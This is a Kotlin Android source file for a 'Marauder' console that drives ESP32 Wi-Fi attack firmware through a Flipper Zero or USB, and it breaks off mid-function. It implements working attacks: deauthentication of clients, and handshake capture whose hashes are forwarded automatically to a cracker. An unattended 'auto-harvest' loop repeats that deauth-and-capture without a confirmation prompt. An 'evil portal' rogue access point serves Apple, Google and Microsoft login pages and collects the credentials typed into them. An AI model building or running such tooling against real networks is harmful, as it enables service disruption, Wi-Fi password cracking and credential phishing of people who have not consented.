package com.foxfw.companion

import android.Manifest
import android.os.Build
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.ExperimentalLayoutApi
import androidx.compose.foundation.layout.FlowRow
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Icon
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateMapOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.foxfw.companion.ui.Eyebrow
import com.foxfw.companion.ui.Fox
import com.foxfw.companion.ui.FoxCard
import com.foxfw.companion.ui.FoxMono
import com.foxfw.companion.ui.Pill
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.isActive
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

private enum class MarMode { RELAY, USB }

/**
 * Marauder control console for the BFFB v2 (ESP32-C5). Two transports, user's choice:
 *  • RELAY — board stays on the Flipper's GPIO UART, driven wirelessly through the Flipper over the
 *    live BLE (or USB-to-Flipper) link via the fox_marauder_io FAP. No cable to the phone.
 *  • USB   — board plugged into the phone's USB-OTG port (CDC-ACM), driven directly.
 * Both feed the same [MarauderLink]. The whole verified CLI renders as a one-tap command palette with
 * argument prompts and an authorized-use gate on every attack, plus a raw field and a live console.
 */
@OptIn(ExperimentalLayoutApi::class)
@Composable
fun MarauderScreen(onClose: () -> Unit) {
    val ctx = LocalContext.current
    val scope = rememberCoroutineScope()

    val usbLink = remember { MarauderUsbLink(ctx.applicationContext) }
    val bleLink = remember { MarauderBleLink() }
    var mode by remember { mutableStateOf(MarMode.RELAY) }
    val link: MarauderLink = if (mode == MarMode.USB) usbLink else bleLink

    val lines = remember { mutableStateListOf<String>() }
    var usbConnected by remember { mutableStateOf(false) }
    var status by remember { mutableStateOf("Relay: board on the Flipper. Connect the Flipper (Device tab), then Use relay.") }
    var raw by remember { mutableStateOf("") }

    var argFor by remember { mutableStateOf<Marauder.Cmd?>(null) }
    var argText by remember { mutableStateOf("") }
    var confirmLine by remember { mutableStateOf<String?>(null) }
    var capturing by remember { mutableStateOf(false) }
    var confirmCapture by remember { mutableStateOf(false) }

    var liveScan by remember { mutableStateOf(false) }
    val seenAps = remember { mutableStateMapOf<String, Marauder.Ap>() } // key = essid|channel, accumulates
    val selected = remember { mutableStateMapOf<Int, Boolean>() } // Marauder AP indices toggled on the board
    var autoShip by remember { mutableStateOf(true) } // forward captured handshakes to the cracker
    var shipped by remember { mutableStateOf(0) }
    var captureBanner by remember { mutableStateOf<String?>(null) } // in-app banner on a capture
    var lastCapture by remember { mutableStateOf("") } // de-dupe: notify only on a NEW capture label
    var capTargetName by remember { mutableStateOf<String?>(null) } // network a capture targets (for the notification)
    var capTargetRssi by remember { mutableStateOf(0) }
    var scanJob by remember { mutableStateOf<Job?>(null) }

    // auto-harvest: loop capture windows unattended, folding each into a running session tally
    val harvest = remember { HarvestSession() }
    var harvesting by remember { mutableStateOf(false) }
    var harvestJob by remember { mutableStateOf<Job?>(null) }
    var harvestTick by remember { mutableStateOf(0) } // bumps each window so the readout recomposes

    // evil portal manager
    var portalOpen by remember { mutableStateOf(false) }
    var portalFile by remember { mutableStateOf("index.html") }
    var portalApIdx by remember { mutableStateOf("") }
    var portalRunning by remember { mutableStateOf(false) }

    // notifications need POST_NOTIFICATIONS on API 33+
    val notifPerm = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
    LaunchedEffect(Unit) {
        if (Build.VERSION.SDK_INT >= 33) notifPerm.launch(Manifest.permission.POST_NOTIFICATIONS)
    }

    val connected = if (mode == MarMode.USB) usbConnected else bleLink.connected

    fun log(line: String) {
        lines.add(line)
        if (lines.size > 600) lines.removeRange(0, lines.size - 600)
        // every AP row that scrolls past (manual list -a or the live loop) accumulates into the map,
        // so the Networks view is the UNION of everything seen — it never shrinks on a partial snapshot
        Marauder.parseAp(line)?.let { ap -> seenAps[ap.essid + "|" + ap.channel] = ap }
        // notify on a NEW capture (complete EAPOL handshake / pwnd PMKID)
        Marauder.captureEvent(line)?.let { ev ->
            if (ev != lastCapture) {
                lastCapture = ev
                val tgt = capTargetName?.let { "$it ($capTargetRssi dBm) · " } ?: ""
                captureBanner = "$tgt$ev"
                lines.add("[⚡ CAPTURE] $tgt$ev")
                HandshakeNotifier.notifyCapture(ctx, "⚡ Handshake captured", "$tgt$ev — saved to SD (.pcap)")
            }
        }
        // auto-ship: if the board prints an hc22000 handshake line, forward it to the cracker
        if (autoShip) {
            Regex("""WPA\*0[12]\*\S+""").find(line)?.value?.let { cand ->
                if (WpaCrack.parsePmkid(cand) != null || WpaCrack.parseEapol(cand) != null) {
                    CrackInbox.offer(cand); shipped++
                    lines.add("[→ shipped handshake to cracker]")
                }
            }
        }
    }

    remember {
        usbLink.onLine { l -> log(l) }
        bleLink.onLine { l -> log(l) }
        true
    }

    DisposableEffect(Unit) {
        onDispose {
            scanJob?.cancel()
            harvestJob?.cancel()
            // cancel-proof scope: `scope` is already cancelled by the time onDispose runs
            CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                runCatching { usbLink.disconnect() }
                runCatching { bleLink.stopDaemon() } // daemon stopscans the board + releases the UART
            }
        }
    }

    // Send one line and collect the reply. dump = a command that prints a lot (list/sniff/help) so it
    // gets a longer capture window; attacks/select/scan-start are short.
    suspend fun sendOne(line: String) {
        val l = link
        if (l is MarauderBleLink) {
            val dump = line.startsWith("list") || line.startsWith("info") || line.startsWith("settings") ||
                line.startsWith("sniff") || line.startsWith("help") || line.startsWith("gpsdata")
            l.sendCapturing(line, if (dump) 3500 else 1200)
        } else {
            l.send(line)
        }
    }

    fun doSend(line: String) {
        android.util.Log.i("FoxMar", "doSend line='$line' mode=$mode linkIs=${link.javaClass.simpleName}")
        log("› $line")
        scope.launch { sendOne(line) }
    }

    // Continuous recon: start the board scanning once, then loop list -a, parsing each dump into the
    // accumulating Networks map (via log()). The board keeps hopping 2.4+5GHz the whole time, so the
    // list grows as more APs are seen. Toggle off = stopscan.
    fun toggleLive() {
        if (liveScan) {
            liveScan = false
            scanJob?.cancel(); scanJob = null
            doSend(Marauder.STOP) // serialized by the relay mutex — queues after any in-flight op
            status = "Live scan stopped — ${seenAps.size} networks seen."
            return
        }
        scanJob?.cancel() // never run two loops at once
        liveScan = true
        seenAps.clear()
        scanJob = scope.launch {
            log("› scanall"); sendOne("scanall") // scanap returns nothing on C5 v1.20.0; scanall populates APs
            delay(2000) // let it start hopping before the first list
            while (liveScan && isActive) {
                sendOne("list -a") // one serialized round-trip; replies flow through log() -> seenAps
                status = "Live scanning 2.4 + 5 GHz… ${seenAps.size} networks"
                delay(2500) // pace it — don't hammer the BLE RPC
            }
        }
    }

    fun onCmd(cmd: Marauder.Cmd) {
        if (cmd.arg != Marauder.ArgKind.NONE) { argFor = cmd; argText = "" }
        else if (cmd.danger) confirmLine = cmd.template
        else doSend(cmd.template)
    }

    // Tapping a network toggles its selection on the board (select -a <idx> toggles in Marauder); the
    // local highlight mirrors it. Attacks then act on the board's selected set.
    fun tapAp(ap: Marauder.Ap) {
        if (selected.containsKey(ap.index)) selected.remove(ap.index) else selected[ap.index] = true
        doSend(Marauder.selectAp(ap.index))
    }

    // Smart handshake capture. Passive sniffing almost never catches a handshake, so this is
    // deauth-ASSISTED: it kicks clients off (targeted if you've selected APs, else nearby) to force a
    // reconnect, which makes the AP emit the PMKID/EAPOL — and it LISTENS continuously for a full
    // window so a capture is actually seen (the old one-tap sniff read for ~2.5s and caught nothing).
    // The captured handshake is saved as a .pcap on the board's SD; the ⚡ banner/notification fires
    // when one lands. Then pull the .pcap → Load .pcap in Handshake Crack.
    // The channel to pin a PMKID capture to: the first selected AP's channel, else the strongest
    // network seen. On C5 v1.20.0 "sniffpmkid -d" / "-d -l" never START — only "sniffpmkid -c <ch> -d"
    // does (verified live); -c also pins the deauth+listen to the target's channel.
    fun capTargetAp(): Marauder.Ap? = seenAps.values.firstOrNull { selected.containsKey(it.index) }
        ?: seenAps.values.maxByOrNull { it.rssi }
    fun capChannel(): Int? = capTargetAp()?.channel

    fun captureHandshake() {
        if (capturing) return
        val targeted = selected.isNotEmpty()
        val tgt = capTargetAp()
        if (tgt == null) { status = "Scan first (Live scan), then tap a network — the capture needs a target channel."; return }
        val ch = tgt.channel
        capTargetName = tgt.essid; capTargetRssi = tgt.rssi
        val cmd = "sniffpmkid -c $ch -d" // channel-pinned deauth-assisted capture (the form that actually starts)
        capturing = true
        log("› $cmd")
        scope.launch {
            try {
                val l = link
                if (l is MarauderBleLink) {
                    val secs = 25
                    val cd = launch {
                        for (s in secs downTo 1) {
                            status = "Capturing PMKID + EAPOL on ch $ch — deauth ${if (targeted) "${selected.size} target(s)" else "strongest AP"} + listen ${s}s…"
                            delay(1000)
                        }
                    }
                    l.sendCapturing(cmd, secs * 1000) // one long window: sustained deauth + continuous listen
                    cd.cancel()
                    l.sendCapturing(Marauder.STOP, 1000) // stop the board's sniff + deauth
                    status = "Capture window done. A caught handshake shows ⚡ above — pull the .pcap off the board SD → Load .pcap to crack."
                } else {
                    l.send(cmd) // USB: the reader streams capture events live; tap Stop when done
                    status = "Capturing (deauth + listen) over USB — handshakes stream live; tap Stop when done."
                }
            } finally {
                capturing = false
            }
        }
    }

    // Continuous handshake harvesting: loop deauth-assisted capture windows forever, folding each
    // window's counts into the session tally and notifying on every new capture. Unattended — leave
    // it running and it keeps grabbing handshakes band-wide. Each capture lands as a .pcap on the SD.
    fun toggleHarvest() {
        if (harvesting) {
            harvesting = false; harvestJob?.cancel(); harvestJob = null
            scope.launch { sendOne(Marauder.STOP) }
            status = "Auto-harvest stopped — ${harvest.totalPwnd} pwnd / ${harvest.totalComplete} full EAPOL over ${harvest.windows} windows."
            return
        }
        if (capturing) return
        harvestJob?.cancel()
        harvesting = true
        harvestJob = scope.launch {
            val tgt = capTargetAp()
            if (tgt == null) { harvesting = false; status = "Scan first, then tap a network — auto-harvest needs a target channel."; return@launch }
            val ch = tgt.channel
            capTargetName = tgt.essid; capTargetRssi = tgt.rssi
            val cmd = "sniffpmkid -c $ch -d" // the form that actually starts on C5 v1.20.0
            log("› auto-harvest: $cmd (looping)")
            while (harvesting && isActive) {
                val before = lines.size
                val l = link
                if (l is MarauderBleLink) {
                    l.sendCapturing(cmd, 22_000)      // one deauth+listen window
                    l.sendCapturing(Marauder.STOP, 800)
                } else {
                    l.send(cmd); delay(22_000); l.send(Marauder.STOP); delay(400)
                }
                val slice = if (lines.size > before) lines.subList(before, lines.size).joinToString("\n") else ""
                val neu = harvest.add(HarvestParse.parseWindow(slice))
                harvestTick++
                status = "Auto-harvest · window ${harvest.windows} · ${harvest.totalPwnd} pwnd · ${harvest.totalComplete} full EAPOL" +
                    if (neu > 0) " · +$neu this pass ⚡" else " · listening…"
                delay(400)
            }
        }
    }

    // Evil-portal step helpers (workflow: scan → stopscan → setap → sethtml → start).
    fun portalSetAp() {
        val idx = portalApIdx.trim().ifEmpty { selected.keys.firstOrNull()?.toString().orEmpty() }
        if (idx.isEmpty()) { status = "Pick a target: tap a network above, or type an AP index."; return }
        doSend("evilportal -c setap $idx")
    }
    fun portalSetHtml() {
        val f = portalFile.trim().ifEmpty { "index.html" }
        doSend("evilportal -c sethtml $f")
    }
    fun portalStart() {
        val f = portalFile.trim()
        doSend(if (f.isEmpty() || f == "index.html") "evilportal -c start" else "evilportal -c start -w $f")
        portalRunning = true
    }
    fun portalStop() { doSend(Marauder.STOP); portalRunning = false }

    fun installFap() {
        if (FlipperTransport.active == null) { status = "No Flipper link — connect it on the Device tab first."; return }
        scope.launch {
            status = "Pushing fox_marauder_io.fap to the Flipper…"
            val bytes = withContext(Dispatchers.IO) {
                runCatching { ctx.assets.open("fox_marauder_io.fap").readBytes() }.getOrNull()
            }
            if (bytes == null) { status = "Relay FAP asset missing from the app."; return@launch }
            val res = withContext(Dispatchers.IO) { MarauderBleLink.deployFap(bytes) }
            status = "Relay FAP: $res" + if (res.endsWith("OK")) " — ready. Now send commands." else "."
        }
    }

    fun connect() {
        if (mode == MarMode.RELAY) {
            status = if (FlipperTransport.active != null)
                "Relay ready — BFFB on the Flipper GPIO, over ${FlipperTransport.kind}. Needs fox_marauder_io.fap on the Flipper."
            else "No Flipper link. Connect the Flipper on the Device tab, then retry."
            return
        }
        val dev = MarauderUsbLink.find(ctx)
        if (dev == null) { status = "No USB device. Plug the board into the phone's OTG port."; return }
        if (!MarauderUsbLink.canDrive(dev)) {
            status = "Found ${dev.productName ?: "a device"} (VID ${"%04x".format(dev.vendorId)}) — an unsupported bridge chip (CDC-ACM + CP210x are driven). Use the Flipper relay."
            return
        }
        scope.launch {
            status = "Requesting USB permission…"
            if (!usbLink.ensurePermission(dev)) { status = "USB permission denied."; return@launch }
            status = usbLink.connect(dev)
            usbConnected = usbLink.connected
        }
    }

    Column(
        Modifier.fillMaxSize().verticalScroll(rememberScrollState())
            .padding(start = 16.dp, end = 16.dp, top = 2.dp, bottom = 12.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp),
    ) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Box(
                Modifier.size(34.dp).clip(RoundedCornerShape(10.dp))
                    .border(1.dp, Fox.line, RoundedCornerShape(10.dp)).clickable { onClose() },
                contentAlignment = Alignment.Center,
            ) { Icon(Icons.Filled.ArrowBack, null, tint = Fox.fg, modifier = Modifier.size(18.dp)) }
            Spacer(Modifier.width(12.dp))
            Column {
                Text("Marauder", color = Fox.fg, fontSize = 17.sp, fontWeight = FontWeight.SemiBold)
                Eyebrow("BFFB v2 · ESP32-C5")
            }
            Spacer(Modifier.weight(1f))
            if (connected) Pill(if (mode == MarMode.USB) "USB" else "RELAY", Fox.live, Fox.liveDim)
            else Pill("offline", Fox.muted, Fox.line)
        }

        captureBanner?.let { cb ->
            FoxCard(border = Fox.live.copy(alpha = 0.6f)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text("⚡", fontSize = 18.sp)
                    Spacer(Modifier.width(10.dp))
                    Column(Modifier.weight(1f)) {
                        Text("Handshake captured", color = Fox.live, fontWeight = FontWeight.Bold, fontSize = 13.sp)
                        Text(cb, color = Fox.fg, fontSize = 11.sp)
                    }
                    Text("✕", color = Fox.muted, fontSize = 15.sp, modifier = Modifier.clickable { captureBanner = null })
                }
            }
        }

        // transport choice + connection + raw command
        FoxCard {
            Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                Eyebrow("TRANSPORT")
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    ModeChip("Flipper relay", mode == MarMode.RELAY, Modifier.weight(1f)) { mode = MarMode.RELAY }
                    ModeChip("USB-OTG", mode == MarMode.USB, Modifier.weight(1f)) {
                        if (usbConnected) { /* keep */ }
                        mode = MarMode.USB
                    }
                }
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    MBtn(if (mode == MarMode.RELAY) "Use relay" else if (usbConnected) "Reconnect" else "Connect USB",
                        Modifier.weight(1f), accent = !connected) { connect() }
                    if (mode == MarMode.RELAY) MBtn("Install FAP", Modifier.weight(1f)) { installFap() }
                    if (mode == MarMode.USB && usbConnected) MBtn("Disconnect", Modifier.weight(1f)) {
                        scope.launch { usbLink.disconnect(); usbConnected = false; status = "Disconnected." }
                    }
                    MBtn("Stop", Modifier.weight(1f)) { doSend(Marauder.STOP) }
                }
                Row(verticalAlignment = Alignment.CenterVertically) {
                    OutlinedTextField(
                        value = raw, onValueChange = { raw = it },
                        placeholder = { Text("raw command, e.g. join -a 3 -p pass", fontSize = 11.sp) },
                        modifier = Modifier.weight(1f),
                        textStyle = androidx.compose.ui.text.TextStyle(fontFamily = FoxMono, fontSize = 12.sp),
                        singleLine = true,
                    )
                    Spacer(Modifier.width(8.dp))
                    MBtn("Send") { if (raw.isNotBlank()) { doSend(raw.trim()); raw = "" } }
                }
                MBtn(if (liveScan) "■ Stop live scan" else "⟳ Live scan (continuous)", Modifier.fillMaxWidth(), accent = true) { toggleLive() }
                MBtn(if (capturing) "capturing… (deauth + listen)" else "⚡ Capture handshake", Modifier.fillMaxWidth()) {
                    if (!capturing) confirmCapture = true
                }
                MBtn(if (harvesting) "■ Stop auto-harvest" else "♻ Auto-harvest (continuous)", Modifier.fillMaxWidth(), accent = harvesting) {
                    if (harvesting || !capturing) toggleHarvest()
                }
                if (harvest.windows > 0 || harvesting) {
                    val t = harvestTick // subscribe: recompose each window
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        if (t >= 0 && harvesting) Pill("HARVEST", Fox.live, Fox.liveDim, dot = true)
                        Spacer(Modifier.width(8.dp))
                        Text("${harvest.totalPwnd} pwnd", color = Fox.live, fontFamily = FoxMono, fontSize = 11.sp)
                        Spacer(Modifier.width(10.dp))
                        Text("${harvest.totalComplete} full EAPOL", color = Fox.live, fontFamily = FoxMono, fontSize = 11.sp)
                        Spacer(Modifier.width(10.dp))
                        Text("${harvest.windows} windows", color = Fox.muted, fontFamily = FoxMono, fontSize = 11.sp)
                    }
                }
                Text(status, color = Fox.faint, fontSize = 11.sp, lineHeight = 15.sp)
            }
        }

        // live networks (accumulated union of every list -a seen)
        if (seenAps.isNotEmpty() || liveScan) {
            FoxCard(modifier = Modifier.fillMaxWidth()) {
                Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                    val g24 = seenAps.values.filter { it.band == BandScan.Band.GHZ24 }.sortedByDescending { it.rssi }
                    val g5 = seenAps.values.filter { it.band == BandScan.Band.GHZ5 }.sortedByDescending { it.rssi }
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Eyebrow("NETWORKS")
                        Spacer(Modifier.width(10.dp))
                        Text("2.4G ${g24.size}", color = Fox.live, fontFamily = FoxMono, fontSize = 10.5.sp)
                        Spacer(Modifier.width(8.dp))
                        Text("5G ${g5.size}", color = Fox.violet, fontFamily = FoxMono, fontSize = 10.5.sp)
                        Spacer(Modifier.weight(1f))
                        if (liveScan) Pill("LIVE", Fox.live, Fox.liveDim)
                        else Text("clear", color = Fox.muted, fontSize = 11.sp, modifier = Modifier.clickable { seenAps.clear(); selected.clear() })
                    }
                    Text("Tap a network to select it (select -a) · then attack the selection.",
                        color = Fox.faint, fontSize = 10.sp)
                    Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                        MBtn("Select all", Modifier.weight(1f)) {
                            seenAps.values.forEach { selected[it.index] = true }
                            doSend(Marauder.selectAllAp())
                        }
                        if (selected.isNotEmpty()) {
                            MBtn("⚔ Deauth (${selected.size})", Modifier.weight(1.2f)) { confirmLine = Marauder.deauth(false) }
                            MBtn("+Capture", Modifier.weight(1f)) { confirmLine = Marauder.deauth(true) }
                        }
                    }
                    // Rendered inline (not a nested list) so the whole screen is one clean scroll.
                    Column(verticalArrangement = Arrangement.spacedBy(1.dp)) {
                        if (g24.isNotEmpty()) {
                            BandHeader("2.4 GHz", g24.size, Fox.live)
                            g24.forEach { ap -> ApRow(ap, Fox.live, selected.containsKey(ap.index)) { tapAp(ap) } }
                        }
                        if (g5.isNotEmpty()) {
                            BandHeader("5 GHz", g5.size, Fox.violet)
                            g5.forEach { ap -> ApRow(ap, Fox.violet, selected.containsKey(ap.index)) { tapAp(ap) } }
                        }
                    }
                }
            }
        }

        // evil portal manager
        FoxCard(modifier = Modifier.fillMaxWidth()) {
            Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.clickable { portalOpen = !portalOpen }) {
                    Eyebrow("EVIL PORTAL")
                    Spacer(Modifier.width(10.dp))
                    if (portalRunning) Pill("LIVE", Fox.crit, Fox.amberDim, dot = true)
                    Spacer(Modifier.weight(1f))
                    Text(if (portalOpen) "▾" else "▸", color = Fox.muted, fontSize = 13.sp)
                }
                if (portalOpen) {
                    Text("Rogue captive portal. Clone a target AP, pick a page that exists on the board SD, start. Submitted creds stream to the console + save to the SD. Authorised testing only.",
                        color = Fox.faint, fontSize = 10.sp, lineHeight = 14.sp)
                    Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        OutlinedTextField(
                            value = portalApIdx, onValueChange = { portalApIdx = it.filter(Char::isDigit) },
                            placeholder = { Text("AP index (or tap a network)", fontSize = 10.sp) },
                            modifier = Modifier.weight(1f),
                            textStyle = androidx.compose.ui.text.TextStyle(fontFamily = FoxMono, fontSize = 12.sp),
                            singleLine = true,
                        )
                        MBtn("Set AP") { portalSetAp() }
                    }
                    FlowRow(horizontalArrangement = Arrangement.spacedBy(6.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                        listOf("index.html", "apple.html", "google.html", "microsoft.html").forEach { f ->
                            val sel = portalFile == f
                            Box(Modifier.clip(RoundedCornerShape(8.dp)).background(if (sel) Fox.amberDim else Fox.surface2)
                                .border(1.dp, if (sel) Fox.amber else Fox.line, RoundedCornerShape(8.dp))
                                .clickable { portalFile = f }.padding(horizontal = 9.dp, vertical = 6.dp)) {
                                Text(f.removeSuffix(".html"), color = if (sel) Fox.amber else Fox.muted, fontFamily = FoxMono, fontSize = 10.sp)
                            }
                        }
                    }
                    Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        OutlinedTextField(
                            value = portalFile, onValueChange = { portalFile = it },
                            placeholder = { Text("page file on SD", fontSize = 10.sp) },
                            modifier = Modifier.weight(1f),
                            textStyle = androidx.compose.ui.text.TextStyle(fontFamily = FoxMono, fontSize = 12.sp),
                            singleLine = true,
                        )
                        MBtn("Set HTML") { portalSetHtml() }
                    }
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        MBtn(if (portalRunning) "● Running" else "▶ Start portal", Modifier.weight(1f), accent = !portalRunning) { portalStart() }
                        MBtn("■ Stop", Modifier.weight(1f)) { portalStop() }
                    }
                    val creds = lines.filter { portalCredLine(it) }
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Text("Captured", color = Fox.fg, fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
                        Spacer(Modifier.width(8.dp))
                        Text("${creds.size}", color = if (creds.isNotEmpty()) Fox.live else Fox.muted, fontFamily = FoxMono, fontSize = 12.sp)
                    }
                    if (creds.isEmpty()) Text("No submissions yet — creds land here as the page is filled in.", color = Fox.faint, fontSize = 10.sp)
                    else Column(verticalArrangement = Arrangement.spacedBy(2.dp)) {
                        creds.takeLast(40).forEach { c -> Text(c, color = Fox.live, fontFamily = FoxMono, fontSize = 10.5.sp, lineHeight = 13.sp) }
                    }
                }
            }
        }

        // console
        FoxCard(modifier = Modifier.fillMaxWidth()) {
            Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Eyebrow("CONSOLE")
                    Spacer(Modifier.weight(1f))
                    Text("⇅ ship ${if (autoShip) "on" else "off"}${if (shipped > 0) " ($shipped)" else ""}",
                        color = if (autoShip) Fox.live else Fox.muted, fontSize = 11.sp,
                        modifier = Modifier.clickable { autoShip = !autoShip })
                    Spacer(Modifier.width(12.dp))
                    Text("clear", color = Fox.muted, fontSize = 11.sp, modifier = Modifier.clickable { lines.clear() })
                }
                // Last lines rendered inline (the whole screen scrolls as one); newest at the bottom.
                Column(verticalArrangement = Arrangement.spacedBy(1.dp)) {
                    lines.takeLast(60).forEach { l ->
                        val col = when {
                            l.startsWith("›") -> Fox.amber
                            l.startsWith("[relay]") -> Fox.warn
                            Marauder.isHandshakeHit(l) -> Fox.live
                            else -> Fox.fg
                        }
                        Text(l, color = col, fontFamily = FoxMono, fontSize = 10.5.sp, lineHeight = 13.sp)
                    }
                }
            }
        }

        // command palette
        Column(
            modifier = Modifier.fillMaxWidth(),
            verticalArrangement = Arrangement.spacedBy(10.dp),
        ) {
            Marauder.catalog.forEach { cat ->
                FoxCard {
                    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                        Eyebrow(cat.name.uppercase())
                        FlowRow(horizontalArrangement = Arrangement.spacedBy(6.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                            cat.cmds.forEach { cmd -> CmdChip(cmd) { onCmd(cmd) } }
                        }
                    }
                }
            }
        }
    }

    val ac = argFor
    if (ac != null) {
        AlertDialog(
            onDismissRequest = { argFor = null },
            title = { Text(ac.label, color = Fox.fg) },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    if (ac.desc.isNotEmpty()) Text(ac.desc, color = Fox.faint, fontSize = 12.sp)
                    if (ac.arg == Marauder.ArgKind.CHOICE) {
                        FlowRow(horizontalArrangement = Arrangement.spacedBy(6.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                            ac.choices.forEach { ch ->
                                val sel = argText == ch
                                Box(
                                    Modifier.clip(RoundedCornerShape(9.dp))
                                        .background(if (sel) Fox.amberDim else Fox.surface2)
                                        .border(1.dp, if (sel) Fox.amber else Fox.line, RoundedCornerShape(9.dp))
                                        .clickable { argText = ch }.padding(vertical = 8.dp, horizontal = 12.dp),
                                ) { Text(ch, color = if (sel) Fox.amber else Fox.fg, fontSize = 12.sp, fontFamily = FoxMono) }
                            }
                        }
                    } else {
                        OutlinedTextField(
                            value = argText, onValueChange = { argText = it },
                            placeholder = { Text("value", fontSize = 12.sp) },
                            singleLine = true,
                            textStyle = androidx.compose.ui.text.TextStyle(fontFamily = FoxMono, fontSize = 13.sp),
                        )
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = {
                    val line = Marauder.build(ac, argText)
                    argFor = null
                    if (line == null) status = "${ac.label} needs a value."
                    else if (ac.danger) confirmLine = line
                    else doSend(line)
                }) { Text("OK", color = Fox.amber) }
            },
            dismissButton = { TextButton(onClick = { argFor = null }) { Text("Cancel", color = Fox.muted) } },
            containerColor = Fox.surface,
        )
    }

    val cl = confirmLine
    if (cl != null) {
        AlertDialog(
            onDismissRequest = { confirmLine = null },
            title = { Text("Authorized use only", color = Fox.crit) },
            text = {
                Text("This transmits an attack on your own equipment:\n\n$cl\n\nOnly run against networks/devices you own or are authorized to test.",
                    color = Fox.fg, fontFamily = FoxMono, fontSize = 12.sp)
            },
            confirmButton = { TextButton(onClick = { doSend(cl); confirmLine = null }) { Text("Transmit", color = Fox.crit) } },
            dismissButton = { TextButton(onClick = { confirmLine = null }) { Text("Cancel", color = Fox.muted) } },
            containerColor = Fox.surface,
        )
    }

    if (confirmCapture) {
        AlertDialog(
            onDismissRequest = { confirmCapture = false },
            title = { Text("Authorized use only", color = Fox.crit) },
            text = {
                Text(
                    "This deauthenticates ${if (selected.isNotEmpty()) "the selected AP(s)' clients" else "nearby clients"} " +
                        "to force a reconnect and capture the PMKID + 4-way EAPOL handshake (saved as .pcap on the board SD). " +
                        "Only on networks you own or are authorized to test.",
                    color = Fox.fg, fontSize = 12.sp, lineHeight = 16.sp,
                )
            },
            confirmButton = { TextButton(onClick = { confirmCapture = false; captureHandshake() }) { Text("Capture", color = Fox.crit) } },
            dismissButton = { TextButton(onClick = { confirmCapture = false }) { Text("Cancel", color = Fox.muted) } },
            containerColor = Fox.surface,
        )
    }
}

@Composable
private fun BandHeader(label: String, count: Int, col: Color) {
    Row(
        Modifier.fillMaxWidth().padding(top = 5.dp, bottom = 1.dp),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        Box(Modifier.size(7.dp).clip(RoundedCornerShape(2.dp)).background(col))
        Spacer(Modifier.width(6.dp))
        Text("$label · $count", color = col, fontFamily = FoxMono, fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
    }
}

@Composable
private fun ApRow(ap: Marauder.Ap, bandCol: Color, selected: Boolean, onClick: () -> Unit) {
    Row(
        Modifier.fillMaxWidth().clip(RoundedCornerShape(6.dp))
            .background(if (selected) Fox.amberDim else Color.Transparent)
            .clickable { onClick() }.padding(vertical = 3.dp, horizontal = 4.dp),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        Text(if (selected) "✓" else "·", color = if (selected) Fox.amber else Fox.faint,
            fontSize = 11.sp, modifier = Modifier.width(14.dp))
        Text("CH${ap.channel}", color = bandCol, fontFamily = FoxMono, fontSize = 10.5.sp, modifier = Modifier.width(48.dp))
        Text(ap.essid, color = if (selected) Fox.amber else Fox.fg, fontFamily = FoxMono, fontSize = 11.sp,
